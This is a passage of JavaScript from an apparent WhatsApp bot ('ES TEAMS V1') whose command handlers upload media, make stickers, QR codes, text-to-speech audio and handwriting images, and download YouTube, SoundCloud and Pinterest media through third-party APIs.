				if ((m.quoted ? m.quoted.type : m.type) === 'videoMessage') {
					const anu = await (m.quoted ? m.quoted.download() : m.download())
					const msg = await generateWAMessageContent({ video: anu }, { upload: XliconBotInc.waUploadToServer })
					await XliconBotInc.relayMessage(m.chat, { ptvMessage: msg.videoMessage }, {})
				} else {
					replygcxlicon('Reply Videos You Want to Convert to PTV Messages!')
				}
			}
			break
                
case 'tourl': {
  const fileType = require('file-type');  // Import the correct function
  const FormData = require('form-data');
  const fetch = require('node-fetch');
  const MAX_FILE_SIZE_MB = 200;  // Define the maximum allowed file size

  // Function to upload media
  async function uploadMedia(buffer) {
    try {
      const { ext } = await fileType.fromBuffer(buffer);  // Use fromBuffer() to get file type
      const bodyForm = new FormData();
      bodyForm.append("fileToUpload", buffer, "file." + ext);
      bodyForm.append("reqtype", "fileupload");

      const res = await fetch("https://catbox.moe/user/api.php", {
        method: "POST",
        body: bodyForm,
      });

      if (!res.ok) {
        throw new Error(`Upload failed with status ${res.status}: ${res.statusText}`);
      }

      const data = await res.text();
      return data;
    } catch (error) {
      console.error("Error during media upload:", error);
      throw new Error('Failed to upload media');
    }
  }

  // Checking for supported media types
  if (/jpg|jpeg|png/.test(mime)) {
    XliconStickWait();  // Notify user of the wait
    let media = await (m.quoted ? m.quoted.download() : m.download());
    const fileSizeMB = media.length / (1024 * 1024);
    if (fileSizeMB > MAX_FILE_SIZE_MB) {
      return replygcxlicon(`File size exceeds the limit of ${MAX_FILE_SIZE_MB}MB.`);
    }
    let mediaUrl = await uploadMedia(media);  // Upload the media and get the URL
    replygcxlicon('Url : ' + mediaUrl);  // Reply with the media URL
  } else if (/webp|video|sticker|audio/.test(mime)) {
    XliconStickWait();  // Notify user of the wait
    let media = await (m.quoted ? m.quoted.download() : m.download());
    const fileSizeMB = media.length / (1024 * 1024);
    if (fileSizeMB > MAX_FILE_SIZE_MB) {
      return replygcxlicon(`File size exceeds the limit of ${MAX_FILE_SIZE_MB}MB.`);
    }
    let mediaUrl = await uploadMedia(media);  // Upload the media and get the URL
    replygcxlicon('Url : ' + mediaUrl);  // Reply with the media URL
  } else {
    replygcxlicon('Send the media you want to upload!');  // If no media is provided
  }
}
break;
                  
			case 'texttospeech-indo': case 'tts-indo': case 'ttsindo': {
				if (!text) return replygcxlicon('Where is the text you want to convert to audio??')
				let { tts } = require('./lib/tts')
				let anu = await tts(text)
				XliconBotInc.sendMessage(m.chat, { audio: anu, ptt: true, mimetype: 'audio/mpeg' }, { quoted: m })
			}
			break


			case 'say': case 'tts': case 'gtts':{
if (!text) return replygcxlicon('Where is the text?')
            let texttts = text
            const xliconrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return XliconBotInc.sendMessage(m.chat, {
                audio: {
                    url: xliconrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`
            }, {
                quoted: m,
            })
        }
        break
                
			case 'toqr': case 'qr': {
				if (!text) return replygcxlicon(`Please include a text or link\n\nFor Example:\n*${prefix + command}* wassup`)
				XliconStickWait()
				await XliconBotInc.sendMessage(m.chat, { image: { url: 'https://api.qrserver.com/v1/create-qr-code/?size=1000x1000&data=' + text }, caption: 'Here you go!' }, { quoted: m })
			}
			break
                
                
			case 'ssweb': {
				if (!text) return replygcxlicon(`Example: ${prefix + command} https://github.com/paskito002`)
				if (!text.startsWith('http')) {
					let buf = 'https://image.thum.io/get/width/1900/crop/1000/fullpage/https://' + q;
					await XliconBotInc.sendMessage(m.chat, { image: { url: buf }, caption: 'Done' }, { quoted: m })
				} else {
					let buf = 'https://image.thum.io/get/width/1900/crop/1000/fullpage/' + q;
					await XliconBotInc.sendMessage(m.chat, { image: { url: buf }, caption: 'Done' }, { quoted: m })
				}
			}
			break
                
			case'smeta': {
if (!/webp/.test(mime)) return replygcxlicon('Reply sticker!')
  var stiker = false
    try {
        let [packname, ...author] = q.split('|')
            //var author = (author  []).join('|')
                let mime = m.quoted.mimetype || ''
                        //let img = await q.download()
                            let img = await XliconBotInc.downloadAndSaveMediaMessage(quoted, makeid(5))
                                if (!img) return replygcxlicon('Reply a sticker!')
                                    var stiker = await addExifAvatar(img, `Made by`, `Cheems Bot`)
                                      } catch (e) {
                                          console.error(e)
                                              if (Buffer.isBuffer(e)) stiker = e
                                                } finally {
                                                    if (stiker) XliconBotInc.sendMessage(m.chat, {
                                                          sticker: stiker
                                                              }, {
                                                                    quoted: m
                                                                        })
                                                                            else return replygcxlicon('reply sticker')
                                                                              }
                                                                              }       
                                                                              break
			
            case 's': case 'sticker': case 'stiker': {
if (!quoted) return replygcxlicon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XliconBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxlicon('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await XliconBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
replygcxlicon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break

case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!args.join(" ")) return replygcxlicon(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
XliconBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
XliconBotInc.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")}, m, { packname: pcknm, author: atnm })
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XliconBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxlicon('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await XliconBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcxlicon(`Photo/Video?`)
}
}
break
			case 'smeme': case 'stickermeme': case 'stickmeme': {
if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return replygcxlicon(`Usage: ${prefix + command} text1|text2`)
let { TelegraPh } = require('./lib/uploader')
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await XliconBotInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
memek = await XliconBotInc.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
} else {
replygcxlicon(`Send/reply image with caption ${prefix + command} text1|text2`)
}
}
break
                
			case 'write': {
				replygcxlicon(`*Example*\n${prefix}writeleft text\n${prefix}writeright text\n${prefix}folioleft text\n${prefix}folioright text`)
			}
			break
                
			case 'writeleft': {
				if (!text) return replygcxlicon(`Send command *${prefix + command}* text`)
				XliconStickWait()
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./src/write/images/book/beforeleft.jpg',
					'-font',
					'./src/write/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+140+153',
					fixHeight,
					'./src/write/images/book/afterleft.jpg'
				])
				.on('error', () => replygcxlicon(mess.error))
				.on('exit', () => {
					XliconBotInc.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/book/afterleft.jpg'), caption: 'Here you go!' }, { quoted: m })
				})
			}
			break
                
			case 'writeright': {
				if (!text) return replygcxlicon(`Send command *${prefix + command}* text`)
				XliconStickWait()
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./src/write/images/book/beforeright.jpg',
					'-font',
					'./src/write/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+128+129',
					fixHeight,
					'./src/write/images/book/afterright.jpg'
				])
				.on('error', () => replygcxlicon(mess.error))
				.on('exit', () => {
					XliconBotInc.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/book/afterright.jpg'), caption: 'Here you go!' }, { quoted: m })
				})
			}
			break
                
			case 'folioleft': {
				if (!text) return replygcxlicon(`Send command *${prefix + command}* text`)
				XliconStickWait()
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
				spawn('convert', [
					'./src/write/images/folio/beforeleft.jpg',
					'-font',
					'./src/write/font/Indie-Flower.ttf',
					'-size',
					'1720x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'4',
					'-annotate',
					'+48+185',
					fixHeight,
					'./src/write/images/folio/afterleft.jpg'
				])
				.on('error', () => replygcxlicon(mess.error))
				.on('exit', () => {
					XliconBotInc.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/folio/afterleft.jpg'), caption: 'Here you go!' }, { quoted: m })
				})
			}
			break
                
			case 'folioright': {
				if (!text) return replygcxlicon(`Send command *${prefix + command}* text`)
				XliconStickWait()
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
				spawn('convert', [
					'./src/write/images/folio/beforeright.jpg',
					'-font',
					'./src/write/font/Indie-Flower.ttf',
					'-size',
					'1720x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'4',
					'-annotate',
					'+89+190',
					fixHeight,
					'./src/write/images/folio/afterright.jpg'
				])
				.on('error', () => replygcxlicon(mess.error))
				.on('exit', () => {
					XliconBotInc.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/folio/afterright.jpg'), caption: 'Here you go!' }, { quoted: m })
				})
			}
			break
			
			// Ai Menu
			case 'ai2': case 'gpt2': case 'openai2': {
				if (!text) return replygcxlicon(`Example: ${prefix + command} query`)
				const hasil = await chatGpt(text);
				 return replygcxlicon(`❗ *Error:*⚠️`);
			}
			break


			// Search Menu
case 'play':
case 'song': {
    try {
        const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
        let status = 'Premium'; 
        let limitMessage = ''; 

        if (!(await checkApprovedNumber(m.sender, reply))) {
            const freeUserLimits = global.freeUserLimits || (global.freeUserLimits = {}); 
            const dailyLimit = 10;
            const today = new Date().toLocaleDateString(); 
            const userLimits = freeUserLimits[m.sender] || (freeUserLimits[m.sender] = {});

            if (!userLimits[today]) userLimits[today] = 0; 
            const remainingLimit = dailyLimit - userLimits[today];

            if (remainingLimit <= 0) {
                replygcxlicon('`𝐃𝐀𝐈𝐋𝐘 𝐋𝐈𝐌𝐈𝐓 𝐄𝐗𝐂𝐄𝐄𝐃𝐄𝐃`\n\n𝐆𝐞𝐭 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 𝐟𝐨𝐫 𝐮𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝 𝐚𝐜𝐜𝐞𝐬𝐬.');
                return;
            }

            userLimits[today]++;
            global.freeUserLimits[m.sender] = userLimits;
            status = 'Free';
            limitMessage = `📊 *Limit:* _${remainingLimit - 1} / ${dailyLimit}_`;
        }

        if (!text) {
            return replygcxlicon(`🎵 *Example:* ${prefix + command} anime whatsapp status`);
        }

        await XliconStickWait();

        const yts = require("yt-search");
        let search = await yts(text);

        if (!search || search.videos.length === 0) {
            return replygcxlicon('❌ *No video found.* Please try with a different keyword.');
        }

        let video = search.videos[0];

        const apiUrl = `https://api.siputzx.my.id/api/d/ytmp3?url=${encodeURIComponent(video.url)}`;
        const axios = require("axios");
        const response = await axios.get(apiUrl);

        if (!response.data || !response.data.status || !response.data.data || !response.data.data.dl) {
            return replygcxlicon('🚫 *Error fetching audio from the URL.* Please try again later.');
        }

        const { title, dl } = response.data.data;

        const displayMessage = `\`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏 𝐒𝐎𝐍𝐆 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐑\`\n\n` +
            `🎶 *Title:* _${title}_\n` +
            `📅 *Released:* _${video.ago}_\n` +
            `💼 *Status:* _${status}_\n` +
            `${limitMessage}\n\n` +
            `📥 *Downloading your song...*\n\n` +
            `*Powered by ES Teams Tech*`;

        // Send the song description with the channel button
        await replygcxlicon(displayMessage);

        const resAudio = await axios.get(dl, { responseType: 'arraybuffer' });
        const audioBuffer = Buffer.from(resAudio.data, 'binary'); 

        let viewChannelLink = global.wagc; // Channel link from global.wagc

        // Send the audio with external ad reply and automatic download behavior
        await XliconBotInc.sendMessage(m.chat, { 
            audio: audioBuffer, 
            mimetype: 'audio/mp4', 
            ptt: true, // Set as voice note
            contextInfo: {
                externalAdReply: {
                    title: "❄️𝙀𝙎 𝙏𝙀𝘼𝙈𝙎 𝙈𝙀𝙉𝙐❄️", // Title for the ad reply
                    body: "Click here to visit our channel!", // Text for the ad reply
                    showAdAttribution: true,
                    mediaType: 1,
                    thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'), // Bot picture
                    sourceUrl: viewChannelLink, // Channel link
                },
            },
            // Set 'download' behavior here to ensure it is automatically downloaded
            download: true
        }, { quoted: m });
        
    } catch (error) {
        console.error("Error in play/song command:", error);
        replygcxlicon("⚠️ *An error occurred while processing your request.* Please try again.");
    }
}
break;
               
//--------------------------------------------------------------------------------------------------//

                


case 'ytvideo': {
  try {
    // Check if the user has provided a valid URL
    if (args.length < 1 || !isUrl(text)) 
      return replygcxlicon(`Where is the link??\n\nExample: ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag`);

    // API URL to fetch video information
    const apiUrl = `https://bk9.fun/download/youtube?url=${encodeURIComponent(text)}`;
    
    // Fetch the response from the API
    let res = await fetch(apiUrl);
    let apiResponse = await res.json();
    
    // Check if the API returned a valid response
    if (!apiResponse.status || !apiResponse.BK9 || !apiResponse.BK9.video) 
      throw new Error("Failed to retrieve video");

    // Extract video data from the API response
    let { title, thumb, channel, published, views, url } = apiResponse.BK9.video;

    // Build the caption with more details
    const ytc = `
      *🎬 Title:* ${title}
      *📅 Published:* ${published}
      *🕒 Duration:*  -- (Duration info not provided by API)
      *👀 Views:* ${views}
      *📺 Channel:* ${channel}
    `.trim();

    // Notify the user that the download is starting
    replygcxlicon("⏳ *Downloading video, please wait...*");

    // Send the video along with the caption
    await XliconBotInc.sendMessage(m.chat, {
      video: { url: url },
      caption: ytc,
      thumbnail: { url: thumb }
    }, { quoted: m });

    // Notify that the download is complete
    replygcxlicon(`✅ *Download complete!* 🎉\n\n${ytc}`);

  } catch (error) {
    console.error("Error in ytvideo command: ", error);
    replygcxlicon("❌ *An error occurred while processing your request. Please try again later.*");
  }
}
break;

				
                


case 'searchsoundcloud': {
  if (!text) return replygcxlicon(`*• Example:* ${prefix + command} metamorphosis`);

  const fetchSoundCloudResults = async (query) => {
    const apiUrl = `https://bk9.fun/search/soundcloud?q=${encodeURIComponent(query)}`;

    try {
      const response = await fetch(apiUrl);
      if (!response.ok) {
        console.error(`API response not OK: ${response.status} ${response.statusText}`);
        throw new Error('API response not OK');
      }
      const json = await response.json();
      return json.status && json.BK9 && json.BK9.length > 0 ? json.BK9 : null;
    } catch (error) {
      console.error(`Error fetching from ${apiUrl}:`, error);
    }
    return null;
  };

  try {
    await XliconStickWait();
    const query = text.trim();
    const results = await fetchSoundCloudResults(query);

    if (!results) {
      return replygcxlicon('❌ Failed to fetch SoundCloud results. Please try again.');
    }

    let soundCloudText = `🎵 *SoundCloud Results for* _"${query}"_:\n\n`;
    results.forEach((track, index) => {
      soundCloudText += `🔊 *Title:* ${track.title}\n🔗 *Link:* ${track.link}\n\n`;
    });

    // Send the formatted text without generateWAMessageFromContent
    return replygcxlicon(soundCloudText);

  } catch (e) {
    return replygcxlicon("`*Error*`");
  }
}
break;

case 'soundcloud': {
  try {
    if (args.length < 1 || !isUrl(text)) {
      return replygcxlicon(`❌ *Where is the link?* \n\nExample: ${prefix + command} https://soundcloud.com/artist/song-name`);
    }

    await XliconStickWait();

    const apiUrl = `${global.api}downloader/sound-cloud?apikey=${global.id}&url=${encodeURIComponent(text)}`;

    let res = await fetch(apiUrl);

    if (!res.ok) {
      throw new Error("❌ *Failed to fetch from API.*");
    }

    let apiResponse = await res.json();

    if (!apiResponse.status || !apiResponse.result || !apiResponse.result.dl_url) {
      throw new Error("❌ *Failed to retrieve audio from API response.*");
    }

    let { title, dl_url } = apiResponse.result;

    const soundcloudMessage = `🎵 *Thank you for using 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏* 🎉`;

    // Send the audio file using the download URL
    await XliconBotInc.sendMessage(m.chat, {
      audio: { url: dl_url },
      mimetype: 'audio/mp3',
      caption: `*🎵 Title*: ${title}\n🔗 *Download Link*: ${dl_url}\n\n${soundcloudMessage}`,
    }, { quoted: m });

  } catch (error) {
    replygcxlicon("❌ *An error occurred while processing your request.* Please try again later.");
  }
}
break;

                
  

//--------------------------------------------------------------------------------------------------//




			case 'pixiv': {
				if (!text) return replygcxlicon(`Example: ${prefix + command} hello`)
				try {
					let { pixivdl } = require('./lib/pixiv')
					let res = await pixivdl(text)
					XliconStickWait()
					for (let i = 0; i < res.media.length; i++) {
						let caption = i == 0 ? `${res.caption}\n\n*By:* ${res.artist}\n*Tags:* ${res.tags.join(', ')}` : ''
						let mime = (await FileType.fromBuffer(res.media[i])).mime 
						await XliconBotInc.sendMessage(m.chat, { [mime.split('/')[0]]: res.media[i], caption, mimetype: mime }, { quoted: m })
					}
				} catch (e) {
					replygcxlicon('Search Not found!')
				}
			}
			break
			case 'pinterest': 
case 'pin': {
  if (!text) {
    return replygcxlicon(`❗ *Example:* ${prefix + command} pinterest_url`);
  }

  XliconStickWait();

  try {
    const apiUrl = `https://bk9.fun/download/alldownload?url=${encodeURIComponent(text)}`;
    const response = await axios.get(apiUrl);

    if (response.data.status === true && response.data.BK9) {
      const lowQualityUrl = response.data.BK9.low;
      const highQualityUrl = response.data.BK9.high;

      if (highQualityUrl) {
        await XliconBotInc.sendMessage(m.chat, {
          video: { url: highQualityUrl },
          caption: "🎉 *Thank you for using 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏*"
        }, { quoted: m });
      } else if (lowQualityUrl) {
        await XliconBotInc.sendMessage(m.chat, {
          video: { url: lowQualityUrl },
          caption: "🎉 *Thank you for using 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏*"
        }, { quoted: m });
      } else {
        return replygcxlicon("⚠️ *No valid video found. Please check the Pinterest link or ensure it contains a video.*");
      }
    } else {
      return replygcxlicon("⚠️ *No valid video found. Please check the Pinterest link or ensure it contains content.*");
    }
  } catch (error) {
    console.error(error);
    return replygcxlicon("❌ *An error occurred while fetching data from Pinterest.*");
  }
}
break;

case 'wallpaper': {
  if (!text) return replygcxlicon('🌍 *Enter Query Title for Wallpaper Search* 🔍');

  await XliconStickWait(); // Indicate that the bot is processing the request

  try {
      // List of API URLs to choose from
      const apiUrls = [
          'https://aemt.uk.to/googleimage?query=',
          'https://meitang.xyz/googleimage?query=',
          'https://btch.us.kg/googleimage?query=',
          'https://api.tioo.eu.org/googleimage?query=',
          'https://api.tioprm.eu.org/googleimage?query='
      ];

      // Randomly select an API URL
      const apiUrl = apiUrls[Math.floor(Math.random() * apiUrls.length)] + encodeURIComponent(text);

      // Fetch the wallpaper directly from the selected API
      let response = await fetch(apiUrl);

      // Check if the response is okay
      if (!response.ok) {
          return replygcxlicon('❌ *Failed to fetch the wallpaper.* Please try again. 🔄');
      }

      // Get the image URL directly from the response
      let wallpaperUrl = await response.json().then(data => data.result[0].url); // Assuming response structure includes a 'result' array

      // Send the wallpaper with a caption
      await XliconBotInc.sendMessage(m.chat, {
          image: { url: wallpaperUrl },
          caption: `🌟 *Wallpaper Search Results* 🌟\n\n_*Here is the wallpaper for: ${text}*_ 🖼️`
      }, { quoted: m });

  } catch (e) {
      console.error(e);
      return replygcxlicon("❗ *Error fetching the wallpaper.* Please try again. ⚠️");
  }
}
break;


     case 'live-wallpaper': {
  try {
    if (!text) return replygcxlicon(`Example: ${prefix + command} cat`);

    // Show loading indicator
    await XliconStickWait();

    // Make API request to fetch live wallpapers
    const axios = require('axios');
    const response = await axios.get(`https://xliconmd-live-wallpapers.vercel.app/api/search?q=${encodeURIComponent(text)}&page=1&limit=10`);

    const { wallpapers } = response.data;

    if (!wallpapers || wallpapers.length === 0) {
      return replygcxlicon('❌ No live wallpapers found for your search.');
    }

    // Select a random wallpaper from the results
    const wallpaper = wallpapers[Math.floor(Math.random() * wallpapers.length)];

    // Prepare message details
    const wallpaperDetails = `🖼️ *Title:* _${wallpaper.title}_\n` +
                             `🔗 *Link:* _${wallpaper.url}_\n`;

    // Send the wallpaper thumbnail and details
    await XliconBotInc.sendMessage(m.chat, {
      image: { url: wallpaper.thumbnail },
      caption: wallpaperDetails
    }, { quoted: m });

    // Send the live wallpaper video
    await XliconBotInc.sendMessage(m.chat, {
      video: { url: wallpaper.video_url },
      caption: '🎥 Here is your live wallpaper!'
    }, { quoted: m });

  } catch (error) {
    console.error("Error in live-wallpaper command: ", error);
    replygcxlicon("⚠️ An error occurred while processing your request.");
  }
}
break;
           
			case 'ringtone': {
				if (!text) return replygcxlicon(`Example: ${prefix + command} black rover`)
				let anu = await ringtone(text)
				let result = pickRandom(anu)
				await XliconBotInc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title + '.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
			}
			break
			
			// Downloader Menu
case 'ytmp3': case 'ytaudio': case 'ytplayaudio': {
    if (!text) return replygcxlicon(`Example: ${prefix + command} youtube_url`);
    if (!text.includes('youtu')) return replygcxlicon('The URL does not contain results from YouTube!');
    
    XliconStickWait();
    
    // First try using the primary API
    try {
        const hasil = await ytMp3(text); // Your original ytMp3 function
        XliconStickWait();
        
        await replygcxlicon(`*🟢 ES TEAMS YT AUDIO DOWNLOADER 🟢*\n\n` +
                            `*🎬 Title:* ${hasil.title}\n` +
                            `*💾 Size:* ${hasil.size}\n` +
                            `*👀 Views:* ${hasil.views ? hasil.views.toLocaleString() : "0"}\n` +
                            `*👍 Likes:* ${hasil.likes ? hasil.likes.toLocaleString() : "0"}\n` +
                            `*👎 Dislikes:* ${hasil.dislike ? hasil.dislike.toLocaleString() : "0"}\n` +
                            `*📺 Channel:* ${hasil.channel}\n` +
                            `*📅 Uploaded On:* ${hasil.uploadDate}\n\n` +
                            `*💻 SERVER: KALI LINUX*\n\n` +
                            `*🔻 DOWNLOADED BY ES TEAMS V1 🔻*`);
        
        await XliconBotInc.sendMessage(m.chat, {
            audio: { url: hasil.result },
            mimetype: 'audio/mpeg',
            contextInfo: {
                externalAdReply: {
                    title: hasil.title,
                    body: hasil.channel,
                    previewType: 'PHOTO',
                    thumbnailUrl: hasil.thumb,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    sourceUrl: text
                }
            }
        }, { quoted: m });
    } catch (error) {
        console.error('Primary API Error (ytMp3):', error);  // Log the error to the console
        // If the first API fails, fall back to the Widipe API
        try {
            const widipeResponse = await axios.get(`https://widipe.com/download/ytdl?url=${text}`);
            const widipeResult = widipeResponse.data.result;
            
            // Fallback response using Widipe API
            await replygcxlicon(`*🟢 ES TEAMS V1 WIDIPE AUDIO DOWNLOADER 🟢*\n\n` +
                                `*🎬 Title:* ${widipeResult.title}\n` +
                                `*👀 Views:* ${widipeResult.views}\n` +
                                `*📺 Channel:* ${widipeResult.name}\n` +
                                `*📅 Uploaded:* ${widipeResult.ago}\n\n` +
                                `*💻 SERVER: KALI LINUX*\n\n` +
                                `*🔻 DOWNLOADED BY ES_TEAMS-V1 🔻*`);
            
            await XliconBotInc.sendMessage(m.chat, {
                audio: { url: widipeResult.mp3 },
                mimetype: 'audio/mpeg'
            }, { quoted: m });
        } catch (err) {
            console.error('Fallback API Error (Widipe MP3):', err);  // Log the Widipe API error to the console
            replygcxlicon('Error: Could not download the audio using either API.');
        }
    }
}
break;



case 'ytmp4': case 'ytvideo': case 'ytplayvideo': {
    if (!text) return replygcxlicon(`Example: ${prefix + command} youtube_url`);
    if (!text.includes('youtu')) return replygcxlicon('The URL does not contain results from YouTube!');
    
    XliconStickWait();
    
    // First try using the primary API
    try {
        const hasil = await ytMp4(text); // Your original ytMp4 function
        XliconStickWait();
        
        const views = hasil.views ? hasil.views.toLocaleString() : "0";
        const likes = hasil.likes ? hasil.likes.toLocaleString() : "0";
        const dislikes = hasil.dislike ? hasil.dislike.toLocaleString() : "0";
        
        await XliconBotInc.sendMessage(m.chat, {
            video: { url: hasil.result },
            caption: `*🟢 ES TEAMS V1 YT DOWNLOADER 🟢*\n\n` +
                     `*🎬 Title:* ${hasil.title}\n` +
                     `*📡 Quality:* ${hasil.quality}\n` +
                     `*💾 Size:* ${hasil.size}\n` +
                     `*👀 Views:* ${views}\n` +
                     `*👍 Likes:* ${likes}\n` +
                     `*👎 Dislikes:* ${dislikes}\n` +
                     `*📺 Channel:* ${hasil.channel}\n` +
                     `*📅 Uploaded On:* ${hasil.uploadDate}\n\n` +
                     `*💻 SERVER: KALI LINUX*\n\n` +
                     `*🔻 DOWNLOADED BY ES_TEAMS-V1 🔻*`
        }, { quoted: m });
    } catch (error) {
        console.error('Primary API Error (ytMp4):', error);  // Log the error to the console
        // If the first API fails, fall back to the Widipe API
        try {
            const widipeResponse = await axios.get(`https://widipe.com/download/ytdl?url=${text}`);
            const widipeResult = widipeResponse.data.result;
            
            const caption = `*_DOWNLOADED BY ES_TEAMS-V1_*\n\n
    🎬 *Title*: _${widipeResult.title}_\n
    ⏱️ *Duration*: _${widipeResult.duration}_\n
    📅 *Uploaded*: _${widipeResult.ago}_\n
    👁️ *Views*: _${widipeResult.views.toLocaleString()}_\n
    👤 *Uploader*: _${widipeResult.name}_\n
    🔗 *Channel*: _${widipeResult.channel}_\n\n
    *💻 SERVER: KALI LINUX*\n\n` +  // Added server info
    `*🔻 DOWNLOADED BY ES_TEAMS-V1 🔻*`; // Added download info

            await XliconBotInc.sendMessage(m.chat, {
                video: { url: widipeResult.mp4 },
                caption: caption,
                thumbnail: { url: widipeResult.thumbnail }
            }, { quoted: m });
        } catch (err) {
            console.error('Fallback API Error (Widipe MP4):', err);  // Log the Widipe API error to the console
            replygcxlicon('Error: Could not download the video using either API.');
        }
    }
}
break;


      case 'yta': {
  if (!text) return replygcxlicon(`❗ *Example:* ${prefix + command} youtube_url`);
  if (!text.includes('youtu')) return replygcxlicon('❌ *The URL does not contain results from YouTube!*');
  XliconStickWait();

  try {
    const response = await axios.get(`https://api.nyxs.pw/dl/yt-direct?url=${encodeURIComponent(text)}`);
    const hasil = response.data;

    if (!hasil.status || !hasil.result.urlAudio) {
      return replygcxlicon('⚠️ *Error fetching audio from the URL.*');
    }

    await XliconBotInc.sendMessage(m.chat, {
      audio: { url: hasil.result.urlAudio },
      mimetype: 'audio/mpeg'
    }, { quoted: m });

  } catch (error) {
    console.error(error);
    return replygcxlicon('❌ *There was an error processing the request.*');
  }
}
break;

                    
  case 'ytv': {
  try {
    if (args.length < 1 || !isUrl(text)) {
      return replygcxlicon(`❌ *Where is the link?* \n\nExample: ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag`);
    }

    await XliconStickWait();

    const apiUrl = `https://bk9.fun/download/youtube2?url=${encodeURIComponent(text)}`;

    let res = await fetch(apiUrl);

    if (!res.ok) {
      throw new Error("❌ *Failed to fetch from API.*");
    }

    let apiResponse = await res.json();

    if (!apiResponse.status || !apiResponse.BK9 || !apiResponse.BK9.BK9) {
      throw new Error("❌ *Failed to retrieve video from API response.*");
    }

    let { BK9: videoUrl } = apiResponse.BK9;

    const ytc = `🎬 *Thank you for using 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏* 🎉`;

    await XliconBotInc.sendMessage(m.chat, {
      video: { url: videoUrl },
      caption: ytc,
    }, { quoted: m });

  } catch (error) {
    replygcxlicon("❌ *An error occurred while processing your request.* Please try again later.");
  }
}
break;
           
    
const https = require('https'); // Import the https module for custom agent
case 'yta2': {
    if (!text) return replygcxlicon(`❌ *Example:* ${prefix + command} youtube_url`);
    if (!text.includes('youtu')) return replygcxlicon('⚠️ *The URL does not contain results from YouTube!*');
    XliconStickWait();

    try {
        const apiUrl = `${global.api}downloader/yt-audio?apikey=${global.id}&url=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);
        const hasil = response.data;

        // Check if audio URL is available
        if (!hasil.result || !hasil.result.audio) {
            throw new Error('❌ *No audio download link found.*');
        }

        const audioLink = hasil.result.audio;
        const caption = `*_DOWNLOADED BY ES_TEAMS-V1_*\n\n🎵 *Title*: _${hasil.result.title}_\n✨ *Enjoy your audio!* 🎶\n🔥 *Powered by ES_TEAMS-V1* 💻`;

        // Send caption to the user
        await replygcxlicon(caption);

        // Send the audio using the correct variable `audioLink`
        await XliconBotInc.sendMessage(m.chat, {
            audio: { url: audioLink },
            mimetype: 'audio/mp4' // Adjust mimetype if necessary
        }, { quoted: m });
    } catch (error) {
        console.error('Error in yta2 command:', error);
        replygcxlicon('⚠️ *An error occurred while processing the audio.*');
    }
}
break;


case 'ytv2': {
    if (!text) return replygcxlicon(`❌ *Example:* ${prefix + command} youtube_url`);
